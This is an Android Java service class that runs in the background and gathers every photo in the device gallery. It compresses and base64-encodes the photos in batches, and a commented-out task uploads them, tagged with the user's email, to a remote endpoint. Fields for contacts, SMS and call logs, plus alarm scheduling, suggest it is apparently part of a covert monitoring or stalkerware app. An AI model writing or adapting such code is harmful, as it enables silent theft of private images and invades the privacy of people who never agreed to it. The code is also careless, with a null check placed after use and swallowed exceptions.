package rapidora.co.myapplication.services;

import android.annotation.SuppressLint;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.PowerManager;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.widget.Button;
import android.widget.GridView;

import com.google.gson.Gson;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.sql.Date;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.concurrent.ExecutionException;

import rapidora.co.myapplication.common.ConnectionDetector;
import rapidora.co.myapplication.common.Constants;
import rapidora.co.myapplication.common.CustomLogger;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.common.Utils;
import rapidora.co.myapplication.model.GalleryModel;


public class GalleryService extends IntentService {
    String contact, sms, calllog;
    ConnectionDetector cd;

    // private static Uri[] mUrls = null;
    // private static String[] strUrls = null;
    //  private String[] mNames = null;
    private String[] all_images = null;
    private GridView gridview = null;
    private Cursor cc = null;
    String image = null;
    int start_loop = 0;
    PowerManager.WakeLock screenLock;
    private Button btnMoreInfo = null;
    SessionManagment sd;
    List<String> image_list = new ArrayList<String>();
    List<Uri> data_list = new ArrayList<Uri>();
    int star_index = 0;
    int loop_end = 10;
    int count;
    String current_date;

    public GalleryService() {
        super(GalleryService.class.getName());

    }

    @Override
    protected void onHandleIntent(Intent intent) {
        cd = new ConnectionDetector(getApplicationContext());
        sd = new SessionManagment(getApplicationContext());
        //start_loop=sd.getIMAGEINDEX();
        CustomLogger.getInsatance(getApplicationContext()).putLog("GalleryService:-" + "Running");

       /* screenLock = ((PowerManager) getApplicationContext().getSystemService(Context.POWER_SERVICE)).newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "TAG");
        screenLock.acquire();*//**/
        star_index = sd.getStart_index();
        if (!cd.isConnectingToInternet()) {
            Constants.galleryTime = 5 * 61 * 1000;
            // Utils.scheduleAlarm2(getApplicationContext(),GalleryService.this);

            //Toast.makeText(getActivity(), "Internet Connection not available", Toast.LENGTH_LONG).show();
        } else {
            Constants.galleryTime = 2*60 * 1000;
            SimpleDateFormat timeStampFormat = new SimpleDateFormat("yyyy-MM-dd");
            Calendar cal = Calendar.getInstance();
            cal.add(Calendar.DATE, -1);
            java.util.Date myDate = new java.util.Date();
            current_date = timeStampFormat.format(new Date(cal.getTimeInMillis()));

            cc = this.getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
                    null);
            all_images = new String[cc.getCount()];
            // File[] files=f.listFiles();
            if (cc != null) {


                new Thread() {
                    public void run() {
                        try {
                            cc.moveToFirst();
                            //   mUrls = new Uri[cc.getCount()];
                            // strUrls = new String[cc.getCount()];
                            //   mNames = new String[cc.getCount()];
                            for (int i = 0; i < cc.getCount(); i++) {
                                cc.moveToPosition(i);
                                //  mUrls[i] = Uri.parse(cc.getString(1));

                                // strUrls[i] = cc.getString(1);
                                //  mNames[i] = cc.getString(3);


                                DateFormat formatter2 = new SimpleDateFormat("yyyy-MM-dd");

                                long milliSeconds2 = Long.parseLong(cc.getString(cc.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)));

                                Calendar calendar2 = Calendar.getInstance();
                                calendar2.setTimeInMillis(milliSeconds2);
                                String imgDate = formatter2.format(calendar2.getTime());
                                if (sd.getLASTSENDIMAGEDATE().equals("")) {
                                    data_list.add(Uri.parse(cc.getString(1)));
                                } else if (Utils.dateValidation(sd.getLASTSENDIMAGEDATE(), String.valueOf(imgDate), "yyyy-MM-dd")) {
                                    data_list.add(Uri.parse(cc.getString(1)));
                                }
                            }
                            executeMethod();
                        } catch (Exception e) {
                        }
                        //    myProgressDialog.dismiss();
                    }
                }.start();


            }
        }


    }


    public void executeMethod() {
        try {
            new GetImge().execute().get();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (ExecutionException e) {
            e.printStackTrace();
        }
    }


    public class GetImge extends AsyncTask<Void, Void, Void> {

        @SuppressLint("WrongThread")
        @Override
        protected void onPreExecute() {


            try {

//mUrls.length
                image_list.clear();
                for (int i = star_index; i < data_list.size(); i++) {
                    try {
                        count++;
                        //  compressedImageBitmap = Compressor.getDefault(this).compressToBitmap(actualImageFile);
                        Bitmap bmp = decodeURI(data_list.get(i).getPath());
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

                        bmp.compress(Bitmap.CompressFormat.JPEG, 50, byteArrayOutputStream);
                        byte[] byteArray = byteArrayOutputStream.toByteArray();
                        String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
                        image_list.add(encoded);
                        if (count >= 11) {
                            break;

                        }
                    } catch (Exception e) {
                        Log.e("Eror", "" + e);
                    }

                }
            } catch (Exception e) {
                Log.e("Eror", "" + e);
            }
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            try {

/*

                    int all_image=mUrls.length;
                    int loop=(all_image/10);
                    star_index=start_loop*10;
                    for(int i=start_loop;i<loop;i++)
                    {
                        image_list.clear();
                        for(int j=star_index;j<=loop_end;j++)
                        {

                            try {

                                //  compressedImageBitmap = Compressor.getDefault(this).compressToBitmap(actualImageFile);
                                Bitmap bmp = decodeURI(mUrls[i].getPath());
                                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

                                bmp.compress(Bitmap.CompressFormat.PNG, 40, byteArrayOutputStream);
                                byte[] byteArray = byteArrayOutputStream.toByteArray();
                                String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
                                image_list.add(encoded);
                            }catch (Exception e)
                            {
                                Log.e("Eror",""+e);
                            }
                        }

                        star_index=star_index+10;
                        loop_end=loop_end+10;



                    }
                    Utils.cancelAlarmGallery(getApplicationContext());
*/


//mUrls.length

            } catch (Exception e) {
                Log.e("Eror", "" + e);
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {

            if (!cd.isConnectingToInternet()) {

            } else {
                if (image_list.size() > 0) {
                    star_index = star_index + 11;
                    sd.setStart_index(star_index);
                  //  new GetQuestion().execute();
                }
            }


            super.onPostExecute(aVoid);


        }

    }

/*
    class GetQuestion extends AsyncTask<Void, Void, Void> {


        @Override
        protected void onPreExecute() {
            int i = image_list.size();
            int k = data_list.size();
            GalleryModel gm = new GalleryModel();

            String[] all_data = image_list.toArray(new String[image_list.size()]);
            gm.setImage(all_data);
            gm.setGmail(sd.getEmail());
            String skj = convertObjetToJson(gm);
            String j1 = skj.replaceAll("\",\"", ",");
            image = j1.replaceAll("\\[", "").replaceAll("\\]", "");
            image = image.replaceFirst(",", "\",\"");
            super.onPreExecute();

        }

        @Override
        protected Void doInBackground(Void... arg0) {


            try {
                String url = Constants.UPDATE_IMAGE;
                String response = Utils.makeHttpURLConnection(url, image, getApplicationContext());

                if (star_index >= data_list.size()) {
                    sd.setLASTSENDIMAGEDATE(current_date);
                    Utils.cancelAlarmGallery(getApplicationContext());
                    sd.setStart_index(0);
                    Log.e("send ALl Images", "Done");
                }

                Log.e("Responsee", "" + response);
                CustomLogger.getInsatance(getApplicationContext()).putLog("GalleryService:-" + "response" + response);

            } catch (IOException e) {
               */
/* if (screenLock.isHeld())
                    screenLock.release();*//*

                CustomLogger.getInsatance(getApplicationContext()).putLog("GalleryService:-" + "Error" + e.toString());
                e.printStackTrace();
            }

            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);

        }
    }
*/

    public Bitmap decodeURI(String filePath) {

        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(filePath, options);

        // Only scale if we need to
        // (16384 buffer for img processing)
        Boolean scaleByHeight = Math.abs(options.outHeight - 100) >= Math.abs(options.outWidth - 100);
        if (options.outHeight * options.outWidth * 2 >= 16384) {
            // Load, scaling to smallest power of 2 that'll get it <= desired dimensions
            double sampleSize = scaleByHeight
                    ? options.outHeight / 100
                    : options.outWidth / 100;
            options.inSampleSize =
                    (int) Math.pow(2d, Math.floor(
                            Math.log(sampleSize) / Math.log(2d)));
        }

        // Do the actual decoding
        options.inJustDecodeBounds = false;
        options.inTempStorage = new byte[512];
        Bitmap output = BitmapFactory.decodeFile(filePath, options);

        return output;
    }

    public static String convertObjetToJson(Object object) {

        Gson gson = new Gson();
        Log.e("json data", "..." + gson.toJson(object));
        return gson.toJson(object);

    }

}
